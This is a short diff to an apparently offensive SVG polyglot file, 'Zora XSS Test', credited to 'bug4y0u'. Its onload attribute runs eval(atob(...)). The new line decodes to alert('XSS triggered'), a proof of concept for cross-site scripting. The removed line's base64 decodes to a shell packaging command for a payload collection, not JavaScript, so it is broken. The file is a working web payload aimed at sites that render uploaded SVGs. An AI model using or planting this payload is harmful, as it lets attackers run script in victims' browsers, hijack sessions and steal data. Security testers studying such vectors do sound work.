@@ -1,11 +1,11 @@
-<!-- ZORAXSS Polyglot Start -->
 <?xml version="1.0" standalone="no"?>
+<!-- ZORAXSS Polyglot Start -->
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
   "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg width="1000" height="1000"
      xmlns="http://www.w3.org/2000/svg"
      xmlns:xlink="http://www.w3.org/1999/xlink"
-     onload="eval(atob('dHIgLWQgJ1xuJyA8IGFsbF9wYXlsb2Fkcy5qcyB8IHRyIC1zICcgJyA+IGFsbF9wYXlsb2Fkcy5taW4uanNiYXNlNjQgLXcwIGFsbF9wYXlsb2Fkcy5taW4uanMgPiBlbmNvZGVkX3BheWxvYWQudHh0'))">
+     onload="eval(atob('YWxlcnQoJ1hTUyB0cmlnZ2VyZWQnKQ=='))">
   <title>Zora XSS Test</title>
   <desc>SVG Polyglot Payload by bug4y0u</desc>
 </svg>
